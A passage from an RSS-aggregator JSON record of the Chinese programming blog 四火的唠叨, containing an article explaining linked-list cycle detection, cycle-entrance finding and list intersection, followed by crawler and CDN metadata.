已经让本来就在疏远的人际，越来越远了。</p> \n<p><strong><font color=\"#ff0000\">文章未经特殊标明皆为本人原创，未经许可不得用于任何商业用途，转载请保持完整性并注明来源链接 <a href=\"https://www.raychase.net/6066\">《四火的唠叨》</a></font></strong></p>\n<div class=\"yarpp-related-rss\"> \n <p>你可能也喜欢看：</p>\n <ol> \n  <li><a href=\"https://www.raychase.net/1280\" rel=\"bookmark\" title=\"编程语言学习和使用的观点\">编程语言学习和使用的观点 </a></li> \n  <li><a href=\"https://www.raychase.net/2358\" rel=\"bookmark\" title=\"在家办公，你还有多远？\">在家办公，你还有多远？ </a></li> \n  <li><a href=\"https://www.raychase.net/4265\" rel=\"bookmark\" title=\"继续说说 “在家办公”\">继续说说 “在家办公” </a></li> \n  <li><a href=\"https://www.raychase.net/1068\" rel=\"bookmark\" title=\"为中国的程序员说几句\">为中国的程序员说几句 </a></li> \n  <li><a href=\"https://www.raychase.net/4749\" rel=\"bookmark\" title=\"写在 Oracle 入职一个月之时（兼招人帖）\">写在 Oracle 入职一个月之时（兼招人帖） </a></li> \n </ol> \n</div>","descriptionType":"html","publishedDate":"Sat, 28 Mar 2020 23:31:07 +0000","feedId":2871,"bgimg":"https://www.raychase.net/wp-content/uploads/2020/03/photo-1585060697712-d9e550dc9e23.jpeg","linkMd5":"a970762dcaea6bd8aca273173bb7d3d1","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn15@2020_2/2020/08/24/15-45-05-641_7baadc993d1c754d.webp","destWidth":1059,"destHeight":698,"sourceBytes":194697,"destBytes":114750,"author":"四火","articleImgCdnMap":{"https://www.raychase.net/wp-content/uploads/2020/03/photo-1585060697712-d9e550dc9e23.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn15@2020_2/2020/08/24/15-45-05-641_7baadc993d1c754d.webp"},"publishedOrCreatedDate":1598283901923},{"createdTime":"2020-08-24 23:45:01","updatedTime":"2020-08-24 23:45:01","title":"从链表存在环的问题说起","link":"https://www.raychase.net/?p=6104","description":"<p>有这样一个经典的算法题，说是一个单向链表，它内部可能存在环，也可能不存在，用怎样的方法，可以检测出，这个链表是否存在环。下图即是这个形成环的示意，如果单向链表的尾部，指向了链表中的一个节点，而不是指向空，那就构成环了。</p> \n<figure class=\"wp-block-image\">\n <a href=\"https://www.raychase.net/wp-content/uploads/2020/05/链表环.png\"><img src=\"https://www.raychase.net/wp-content/uploads/2020/05/链表环.png\" alt=\"\" class=\"wp-image-6105\" /></a>\n</figure> \n<p>接着的一个问题是，怎么检测出这个链表是否有环？</p> \n<p>看到这个问题，也许你会觉得，太简单了，但是这个问题只是一个引子。在 <a href=\"https://www.raychase.net/4450\" target=\"_blank\" rel=\"noreferrer noopener\">《求第 K 个数的问题》</a>一文中，我从简入深，逐步展开，把这 “第 K 个数” 的一系列问题翻了个底朝天。我想关于这个链表成环问题，我也利用类似的思路，看看我是不是也能把这一个问题前前后后讲清楚。</p> \n<h3>判断单向链表是否成环</h3> \n<p>在进一步思考怎样判断这个成环的问题以前，先考虑一件事情，如果成环，有没有可能成一个以上的环？</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/05/两个链表环.png\"><img class=\"alignnone size-full wp-image-6106\" src=\"https://www.raychase.net/wp-content/uploads/2020/05/两个链表环.png\" alt=\"\" width=\"570\" height=\"254\" /></a></p> \n<p>从图示上看，似乎说得通，可事实上却是不可能的，因为 M 点需要有两个后继节点，一个用于构成该处的环，一个用于指向 N 的方向，这显然对于一般我们说的单向链表来说，是不可能做到的。</p> \n<p>那么，怎么检测单向链表是否成环呢？</p> \n<p>网上能见到的最普遍的解决方法就是双指针，一快一慢，从链表头部开始，快的每次走两步，慢的一次走一步，交替进行，直到二者相遇或快指针抵达链表尾部。如果相遇说明存在环。</p> \n<p>不过，这是一个巧妙的方法，是一个时间复杂度在 O(n)、空间复杂度在 O(1) 的好方法，却不是唯一的方法。还有一个思路是，用某种方式记录下走过的节点，如果再次遇到了，就说明成环了。这种方法只需要一个指针，且不会重复遍历走过了的节点，但缺点是存在记录走过节点的开销：</p> \n<ul> \n <li>如果链表节点允许使用某变量标记状态（例如 visited 这样的布尔值），当然可以，且不需要额外的空间复杂度；</li> \n <li>如果不允许，可以额外使用一个 HashSet 来记录节点，如果存在过，就找到节点了，这种方式的空间复杂度是 O(n)。</li> \n</ul> \n<p>再回到那个一快一慢的双指针问题上，有一些基本的问题需要搞清楚。</p> \n<p>一快一慢的双指针，在链表成环的情况下，它们一定会遇到吗，有没有可能恰好错过呢？</p> \n<p>不会错过，一定会相遇。我们分两种情况考虑：</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/05/快慢指针相遇.png\"><img class=\"alignnone wp-image-6107 size-full\" src=\"https://www.raychase.net/wp-content/uploads/2020/05/快慢指针相遇.png\" alt=\"\" width=\"212\" height=\"122\" /></a></p> \n<ul> \n <li>一种情况是快指针恰好落后慢指针一个身位，那么显然慢指针之后的那个位置，就是它们下一个回合碰面的位置；</li> \n <li>另一种情况是快指针落后更多，那么快指针会慢慢赶上来，因为每一个回合快指针走两步，而慢指针走一步，因此每一个回合二者都可以缩短长度为 1 的距离，直到前面说到的只差一个身位的情况出现。</li> \n</ul> \n<h3>寻找环入口</h3> \n<p>那么，下一个自然的问题是，怎样找到那个从单向链表进入环的节点（环入口）？</p> \n<p>乍一看这个问题，可能很难找到一个高效的解决方法。我们先退一步，仔细分析一下刚才判断成环的步骤，这里面利用了一个事实，如果链表成环，那么快慢指针一定会相遇。那么一个很自然的问题是，它们会在哪里相遇？</p> \n<p>首先，它们肯定在环上相遇，因为直线部分 SN 不可能出现 “追上” 的现象。那么，假设它们相遇的点为 P：</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/05/相遇点.png\"><img class=\"alignnone size-full wp-image-6108\" src=\"https://www.raychase.net/wp-content/uploads/2020/05/相遇点.png\" alt=\"\" width=\"311\" height=\"273\" /></a></p> \n<ul> \n <li>对于快指针来说，从起点 S 走到 P 点，假如说绕了 m 圈，环周长为 p，那么一共走了 SN + mp + NP，其中 NP 为最后一圈从 N 逆时针走到 P 的距离。</li> \n <li>而对于慢指针来说，从 S 走到 P 点，一定只绕了不到一圈，也就是一共走了 SN + NP 的距离。</li> \n</ul> \n<p>这里有个问题，为什么慢指针从 S 走到 P 点，一定只绕了不到一圈？</p> \n<p>因为对于慢指针来说，在 “运气最背” 的情况下，就是它刚抵达 N 点的时候，快指针恰好已经路过 N 了，因此在 N 没有相遇。那么按照快指针两倍于慢指针速度的情况来说，慢指针一圈之内，也就是快指针两圈之内一定可以发生 “赶上并超过”，那么也就一定会发生 “相遇”（由于前面的结论，它们不会错过）。因此，这种情况下，相遇的时候，慢指针一定还没有绕足一圈。</p> \n<p>好，由于我们知道在 P 点相遇的时候，快指针实际走了慢指针两倍的距离，于是得到：</p> \n<pre>SN + mp +NP = 2 * (SN + NP)</pre> \n<p>所以，我们得到：</p> \n<pre>mp = SN + NP</pre> \n<p>这意味着什么？<span style=\"color: #ff0000;\"><strong>这意味着因为 SN+NP 是环周长的倍数，也就意味着在快慢指针相遇在 P 点的时候，如果这个慢指针继续走 SN 的距离，不管这个 SN 实际会绕多少圈，一定会最终停到 N 点</strong></span>。</p> \n<p>我们虽然还是不知道这个 SN 有多长，但是我们在快慢指针相遇在 P 点的时候，把快指针撤回起点，并且给了快指针一个新指令——你和慢指针一样，每次走一步。这样，慢指针从 P 点开始，逆时针向 N 逼近；快指针从 S 点开始，也以同样的速率向 N 逼近。等它们相遇的时候，恰好就是 N 点，也就是环入口。同时，也获知了 SN 的长度。</p> \n<h3>计算环周长</h3> \n<p>如果环入口准确定位了，那么环周长也自然不成问题了。</p> \n<p>从环入口开始计数，直到若干步后，重新回到环入口。知道了环周长，根据前面获知的 SN，也就知道了 NP（从环入口 N 逆时针遍历到快慢指针相遇点 P）的距离。</p> \n<h3>判断链表相交</h3> \n<p>链表相交，指的是两个不同的链表，链表头不同，但是链表尾部却相同。如图所示：</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/05/链表相交.png\"><img class=\"alignnone size-full wp-image-6109\" src=\"https://www.raychase.net/wp-content/uploads/2020/05/链表相交.png\" alt=\"\" width=\"420\" height=\"137\" /></a></p> \n<p>其中，一个链表从头部 S 开始，另一个从头部 T 开始，二者相交在节点 N，最后共同收尾于 E。</p> \n<p>怎样判断链表是否相交，如果是，又怎样找到相交的节点 N？</p> \n<p>根据前面寻找环入口问题的启示，如果 SN 的长度等于 TN，那么一个指针从 S 开始，另一个从 T 开始，一样的速率前进，相交的地方就是 N。</p> \n<p>但是 SN 和 TN 并不一定相等。</p> \n<p>不过也没关系，先对于链表 S-N-E，遍历一遍，得到长度 l1；再对于链表 T-N-E，遍历一遍，得到长度 l2，对于二者中长度较长的一个，让这个指针单独先走一段（以下图为例，从 S 走到 Q），走的这段长度恰好为 l1 和 l2 的差值，把这段差值给抹平。这样一来，QN 就等于 TN 了，这样两个指针就可以同样速率往后前进了，相遇的 N 点就是相交的节点；如果一直不相遇，那就是没有相交。</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/05/链表相交2.png\"><img class=\"alignnone size-full wp-image-6110\" src=\"https://www.raychase.net/wp-content/uploads/2020/05/链表相交2.png\" alt=\"\" width=\"420\" height=\"153\" /></a></p> \n<h3>链表相交和链表成环一起出现</h3> \n<p>都很简单是不是？有了前面的铺垫，下面来讨论最复杂的问题。</p> \n<p>假如说，链表成环和链表相交一起出现，即分别有两个链表，它们可能成环，也可能相交，还可能既成环、又相交。现在，怎样判断它们是否成环，如果成环，环入口在哪里？是否相交，如果相交，相交点又在哪里？</p> \n<p>看起来似乎问题一下子复杂了很多，可是仔细观察一下这两个问题，它们的地位不是均等的——</p> \n<ul> \n <li>成环的判断，并不依赖于相交的判断。换言之，无论两个链表是否相交，都可以利用前面所述的成环判断，和环入口的计算方式求得。</li> \n <li>可是相交的判断却依赖于成环的判断。换言之，要求相交的点需要知道链表的长度，而一旦链表成环了，这个长度就不再能用通用的方法来求解了。</li> \n</ul> \n<p>因此，先判断链表是否成环，并且分别求出这两个链表的环入口（如果成环的话），之后再考虑链表相交的问题。</p> \n<p>接着，关于成环和相交，我们先按照这两个链表各自是否具有环来进行如下分类：</p> \n<h4>两个链表都不成环</h4> \n<p>如果这两个链表都不成环，那么问题退化为前面讲的相交问题。这是最简单的 case。</p> \n<h4>只有一个链表成环</h4> \n<p><span style=\"color: #ff0000;\"><strong>如果这两个链表，一个成环，而另一个不成环，那么它们二者肯定不相交。</strong></span>这个结论是显然的，因为相交，意味着这个环是共用的，那么自然不可能一个成环，而另一个不成环了。</p> \n<p>可是也许你可能会说，不对，如果先成环，成环之后再出现相交呢，这样环就可以不是共用的了，于是不就可以两个链表相交，且一个链表成环，而另一个不成环了吗？</p> \n<p>不对，这样是不行的，在相交的情况下，要成环且这个环不共用，只能出现下面这种情况：</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/05/一环一相交.png\"><img class=\"alignnone size-full wp-image-6116\" src=\"https://www.raychase.net/wp-content/uploads/2020/05/一环一相交.png\" alt=\"\" width=\"501\" height=\"266\" /></a></p> \n<p>上图中，这个环只被以 T 为头部的链表单独拥有，而不被以 S 为头部的链表所拥有。可是，这个图是错的，错的地方就在于，我们已经讨论过了，在环上是无法分叉出去的，即 X 点是不可能存在的。</p> \n<h4>两个链表都成环</h4> \n<p>这时，这个问题就比较有意思了，下面我们按照相交点出现的位置来分别讨论。</p> \n<p>这种情况下，我们把环入口的点视作两个链表的尾部，然后可以用前面所述的算法求得相交的点。</p> \n<p>如果在遍历到环入口以前，找到了两个链表相交的节点，那么我们遇到了<span style=\"color: #ff0000;\"><strong>情况一，相交的节点先于成环的节点出现</strong></span>：</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/05/先相交，后成环.png\"><img class=\"alignnone size-full wp-image-6111\" src=\"https://www.raychase.net/wp-content/uploads/2020/05/先相交，后成环.png\" alt=\"\" width=\"521\" height=\"232\" /></a></p> \n<p>反之，如果遍历到环入口时，依然没有发现相交的节点，那么存在下面所述的情况二、三和四：</p> \n<p><span style=\"color: #ff0000;\"><strong>情况二，成环且不相交，相当于两个独立的带环链表</strong></span>：</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/05/两个环.png\"><img class=\"alignnone size-full wp-image-6113\" src=\"https://www.raychase.net/wp-content/uploads/2020/05/两个环.png\" alt=\"\" width=\"200\" height=\"262\" /></a></p> \n<p><span style=\"color: #ff0000;\"><strong>情况三，环入口和相交的节点一起出现</strong></span>：</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/05/成环和相交一起出现.png\"><img class=\"alignnone size-full wp-image-6112\" src=\"https://www.raychase.net/wp-content/uploads/2020/05/成环和相交一起出现.png\" alt=\"\" width=\"318\" height=\"296\" /></a></p> \n<p><span style=\"color: #ff0000;\"><strong>情况四，属于情况三的特殊版本，两个环入口出现在同一个点</strong></span>：</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/05/共用环入口.png\"><img class=\"alignnone size-full wp-image-6117\" src=\"https://www.raychase.net/wp-content/uploads/2020/05/共用环入口.png\" alt=\"\" width=\"318\" height=\"300\" /></a></p> \n<p>有没有可能有情况五，即先出现环入口，再出现相交的节点？</p> \n<p>不可能。因为前面已经介绍了，相交就意味着一旦有环，这个环就是两个链表共用的，因此这个环入口一旦出现，就意味着一个链表连上了另一个链表的环，也就意味着相交点也出现了。因此，这种情况下二者是一起出现的，不可能出现环入口早于相交节点的情况。</p> \n<p>那么现在的问题是，怎样区分情况二、三和四？</p> \n<p>首先检测是不是两个环的环入口共用，如果共用，就是情况四；反之，根据如下策略区分情况二还是三：</p> \n<p>既然两个环入口都找到了，那么以任意一个环入口作为起点，开始遍历，绕环一周，如果期间遇到了另一个环入口，说明是情况三，否则则是情况二。</p> \n<p>好，这个问题就讨论到这里。你也可以看到，如果单独拿出最后一个问题来，这是一个有着相当复杂度的问题。不过如果逐步深入进来的话，应该就好很多。</p> \n<p>记得在差不多快要十年前了，我 “莫名其妙” 地参加了微软的面试，而电话面试问的题目就是本文一开始的链表成环判断的问题。由于对外企面试的玩法一无所知，我被虐得体无完肤。现在看起来这实在是一个太过普通的问题，但当时的我对于算法的认识是非常浅的，也没有给出一个非常好的解决办法。但是从那一天开始，我才真正算是逐步开始接触并学习算法，因此这篇文章，也算对它小小的纪念。</p> \n<p>最后，我想说明的是，在分析上面这些问题的时候，我没有写一点代码。我觉得，这样的纯算法问题，只要思路清楚了，代码基本不是什么问题。</p>\n<p><strong><font color=\"#ff0000\">文章未经特殊标明皆为本人原创，未经许可不得用于任何商业用途，转载请保持完整性并注明来源链接 <a href=\"https://www.raychase.net/6104\">《四火的唠叨》</a></font></strong></p>\n<div class=\"yarpp-related-rss\"> \n <p>你可能也喜欢看：</p>\n <ol> \n  <li><a href=\"https://www.raychase.net/1374\" rel=\"bookmark\" title=\"再谈大楼扔鸡蛋的问题\">再谈大楼扔鸡蛋的问题 </a></li> \n  <li><a href=\"https://www.raychase.net/2763\" rel=\"bookmark\" title=\"LeetCode 算法题目解答汇总\">LeetCode 算法题目解答汇总 </a></li> \n  <li><a href=\"https://www.raychase.net/2861\" rel=\"bookmark\" title=\"一道随机数题目的求解\">一道随机数题目的求解 </a></li> \n  <li><a href=\"https://www.raychase.net/4450\" rel=\"bookmark\" title=\"求第 K 个数的问题\">求第 K 个数的问题 </a></li> \n  <li><a href=\"https://www.raychase.net/850\" rel=\"bookmark\" title=\"MVC 框架的映射和解耦\">MVC 框架的映射和解耦 </a></li> \n </ol> \n</div>","descriptionType":"html","publishedDate":"Mon, 11 May 2020 07:42:16 +0000","feedId":2871,"bgimg":"https://www.raychase.net/wp-content/uploads/2020/05/链表环.png","linkMd5":"91a733ca2fa6f23baadbb8f5cf90eb3e","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn92@2020_1/2020/08/24/15-45-03-603_2d1894b3ad18e472.webp","destWidth":301,"destHeight":225,"sourceBytes":3992,"destBytes":3820,"author":"四火","articleImgCdnMap":{"https://www.raychase.net/wp-content/uploads/2020/05/链表环.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn92@2020_1/2020/08/24/15-45-03-603_2d1894b3ad18e472.webp","https://www.raychase.net/wp-content/uploads/2020/05/两个链表环.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn7@2020_5/2020/08/24/15-45-11-123_a182dc0b61f103c8.webp","https://www.raychase.net/wp-content/uploads/2020/05/快慢指针相遇.png":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn51@2020_3/2020/08/24/15-45-10-991_b099ce68545b964e.webp","https://www.raychase.net/wp-content/uploads/2020/05/相遇点.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn83@2020_2/2020/08/24/15-45-10-184_ba4adbf8834eabb9.webp","https://www.raychase.net/wp-content/uploads/2020/05/链表相交.png":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn75@2020_6/2020/08/24/15-45-10-134_0d4f19d9eaba38df.webp","https://www.raychase.net/wp-content/uploads/2020/05/链表相交2.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn30@2020_3/2020/08/24/15-45-11-015_bd3e3e11e4291857.webp","https://www.raychase.net/wp-content/uploads/2020/05/一环一相交.png":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn40@2020_4/2020/08/24/15-45-10-964_3e3fff9d68bf03cd.webp","https://www.raychase.net/wp-content/uploads/2020/05/先相交，后成环.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn67@2020_2/2020/08/24/15-45-10-428_ee36fc583bbfafa5.webp","https://www.raychase.net/wp-content/uploads/2020/05/两个环.png":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn71@2020_6/2020/08/24/15-45-10-417_53e378192272e729.webp","https://www.raychase.net/wp-content/uploads/2020/05/成环和相交一起出现.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn24@2020_5/2020/08/24/15-45-10-152_74286d2b6dd518ab.webp","https://www.raychase.net/wp-content/uploads/2020/05/共用环入口.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn27@2020_3/2020/08/24/15-45-11-214_0166f5fe971633a0.webp"},"publishedOrCreatedDate":1598283901923}],"record":{"createdTime":"2020-08-24 23:45:01","updatedTime":"2020-08-24 23:45:01","feedId":2871,"fetchDate":"Mon, 24 Aug 2020 15:45:01 +0000","fetchMs":2879,"handleMs":3695,"totalMs":29295,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"52.1.254.205","hostName":"us-001.herokuapp.com","requestId":"aa2eb04cc9374e5498ce27eda9f33020_2871","contentType":"application/rss+xml; charset=UTF-8","totalBytes":1560994,"bgimgsTotal":9,"bgimgsGithubTotal":9,"articlesImgsTotal":34,"articlesImgsGithubTotal":34,"successGithubMap":{"myreaderx14":1,"myreaderx8":2,"myreaderx7":1,"myreaderx15":1,"myreaderx16":1,"myreaderx6":1,"myreaderx32":1,"myreaderx10":2,"myreaderx4":2,"myreaderx33":1,"myreaderx3":1,"myreaderx11":1,"myreaderx12":1,"myreaderx2":1,"myreaderx1":2,"myreaderx13":1,"myreaderx30":2,"myreaderx31":1,"myreaderx18":1,"myreaderx19":1,"myreaderx":1,"myreaderx25":1,"myreaderx27":1,"myreaderx21":1,"myreaderx22":1,"myreaderx23":1,"myreaderx24":1,"myreaderx5oss":1,"myreaderx29":1},"failGithubMap":{}},"feed":{"createdTime":"2020-08-24 21:31:45","updatedTime":"2020-08-24 21:31:45","id":2871,"name":"四火的唠叨","url":"http://www.raychase.net/feed","subscriber":null,"website":null,"icon":"https://www.raychase.net/favicon.ico","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx63/cdn9@2020_2/2020/08/24/15-45-01-013_d91fe853fc0a0b03.jpg","description":"一个纯正程序员的啰嗦","weekly":null,"link":"https://www.raychase.net"},"noPictureArticleList":[],"tmpCommonImgCdnBytes":403002,"tmpBodyImgCdnBytes":1157992,"tmpBgImgCdnBytes":0,"extra4":{"start":1598283894474,"total":0,"statList":[{"spend":3760,"msg":"获取xml内容"},{"spend":3695,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":14602,"msg":"正文链接上传到cdn"}]},"extra5":34,"extra6":34,"extra7ImgCdnFailResultVector":[],"extra10_invalidATagHrefValue":{"https://www.raychase.net/?p=6099_/5749":"https://www.raychase.net/5749","https://www.raychase.net/?p=5790_/5318":"https://www.raychase.net/5318","https://www.raychase.net/?p=5808_/4620":"https://www.raychase.net/4620","https://www.raychase.net/?p=6099_/5934":"https://www.raychase.net/5934","https://www.raychase.net/?p=6104_/4450":"https://www.raychase.net/4450","https://www.raychase.net/?p=6129_/4687":"https://www.raychase.net/4687","https://www.raychase.net/?p=6129_/4620":"https://www.raychase.net/4620","https://www.raychase.net/?p=6066_/4265":"https://www.raychase.net/4265","https://www.raychase.net/?p=5934_/1625":"https://www.raychase.net/1625","https://www.raychase.net/?p=5790_/5808":"https://www.raychase.net/5808","https://www.raychase.net/?p=6083_/4083":"https://www.raychase.net/4083","https://www.raychase.net/?p=5808_#":"https://www.raychase.net/?p=5808#","https://www.raychase.net/?p=6066_/2358":"https://www.raychase.net/2358","https://www.raychase.net/?p=5808_/5790":"https://www.raychase.net/5790","https://www.raychase.net/?p=5934_#":"https://www.raychase.net/?p=5934#"},"extra111_proxyServerAndStatMap":{"http://us-039.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-53.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe65.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-007.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe61.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-035.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-015.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-030.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-52.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-011.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-23.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe69.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-031.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-019.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe-57.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-003.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-023.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-027.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/05/链表环.png","sourceStatusCode":200,"destWidth":301,"destHeight":225,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn92@2020_1/2020/08/24/15-45-03-603_2d1894b3ad18e472.webp","sourceBytes":3992,"destBytes":3820,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":2303,"convertSpendMs":10,"createdTime":"2020-08-24 23:45:02","host":"us-035*","referer":"https://www.raychase.net/?p=6104","linkMd5ListStr":"91a733ca2fa6f23baadbb8f5cf90eb3e,91a733ca2fa6f23baadbb8f5cf90eb3e","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"95.7%","sourceSize":"3.9 KB","destSize":"3.7 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/04/alvaro-reyes-qWwpHwip31M-unsplash.jpg","sourceStatusCode":200,"destWidth":640,"destHeight":427,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn99@2020_1/2020/08/24/15-45-04-142_bcd6cc1609fd9f6b.webp","sourceBytes":37060,"destBytes":19722,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":2940,"convertSpendMs":46,"createdTime":"2020-08-24 23:45:02","host":"us-011*","referer":"https://www.raychase.net/?p=6083","linkMd5ListStr":"40473ed73e13f075fc1b2992559e208c,40473ed73e13f075fc1b2992559e208c","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"53.2%","sourceSize":"36.2 KB","destSize":"19.3 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/08/Snip20200809_2.png","sourceStatusCode":200,"destWidth":458,"destHeight":447,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn19@2020_2/2020/08/24/15-45-04-609_30acb39babbb7560.webp","sourceBytes":19103,"destBytes":6706,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":3358,"convertSpendMs":10,"createdTime":"2020-08-24 23:45:02","host":"us-015*","referer":"https://www.raychase.net/?p=6197","linkMd5ListStr":"9f899cfca3c5a170616710d03b1c84f4,9f899cfca3c5a170616710d03b1c84f4","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"35.1%","sourceSize":"18.7 KB","destSize":"6.5 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/06/Raspberry.jpg","sourceStatusCode":200,"destWidth":466,"destHeight":378,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn12@2020_1/2020/08/24/15-45-04-847_083301c5782ad3e5.webp","sourceBytes":32391,"destBytes":29422,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":3704,"convertSpendMs":15,"createdTime":"2020-08-24 23:45:02","host":"us-039*","referer":"https://www.raychase.net/?p=6129","linkMd5ListStr":"93cfdd9891fef6b848bf4676af464a96,93cfdd9891fef6b848bf4676af464a96","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"90.8%","sourceSize":"31.6 KB","destSize":"28.7 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/04/photo-1483213097419-365e22f0f258.jpeg","sourceStatusCode":200,"destWidth":750,"destHeight":500,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn3@2020_4/2020/08/24/15-45-04-840_2d1d5544666d6fb4.webp","sourceBytes":85749,"destBytes":48240,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":4317,"convertSpendMs":23,"createdTime":"2020-08-24 23:45:02","host":"europe-23*","referer":"https://www.raychase.net/?p=6099","linkMd5ListStr":"33acec1e7ca7ce7089139000e7dd720f,33acec1e7ca7ce7089139000e7dd720f","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"56.3%","sourceSize":"83.7 KB","destSize":"47.1 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/02/interview.jpg","sourceStatusCode":200,"destWidth":1280,"destHeight":853,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn8@2020_3/2020/08/24/15-45-04-898_76581a5648a574a0.webp","sourceBytes":99383,"destBytes":47048,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":4370,"convertSpendMs":57,"createdTime":"2020-08-24 23:45:02","host":"europe61*","referer":"https://www.raychase.net/?p=5934","linkMd5ListStr":"887c898e7462a22bef26f64139fbd840,887c898e7462a22bef26f64139fbd840","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"47.3%","sourceSize":"97.1 KB","destSize":"45.9 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/03/photo-1585060697712-d9e550dc9e23.jpeg","sourceStatusCode":200,"destWidth":1059,"destHeight":698,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn15@2020_2/2020/08/24/15-45-05-641_7baadc993d1c754d.webp","sourceBytes":194697,"destBytes":114750,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":4572,"convertSpendMs":59,"createdTime":"2020-08-24 23:45:02","host":"us-027*","referer":"https://www.raychase.net/?p=6066","linkMd5ListStr":"a970762dcaea6bd8aca273173bb7d3d1,a970762dcaea6bd8aca273173bb7d3d1","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"compressRate":"58.9%","sourceSize":"190.1 KB","destSize":"112.1 KB"},{"code":1,"isDone":false,"source":"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200102_146-1024x620.png","sourceStatusCode":200,"destWidth":1024,"destHeight":620,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn95@2020_5/2020/08/24/15-45-06-047_ede9257bb0433f30.webp","sourceBytes":258316,"destBytes":23854,"targetWebpQuality":75,"feedId":2871,"totalSpendMs":4862,"convertSpendMs":48,"createdTime":"2020-08-24 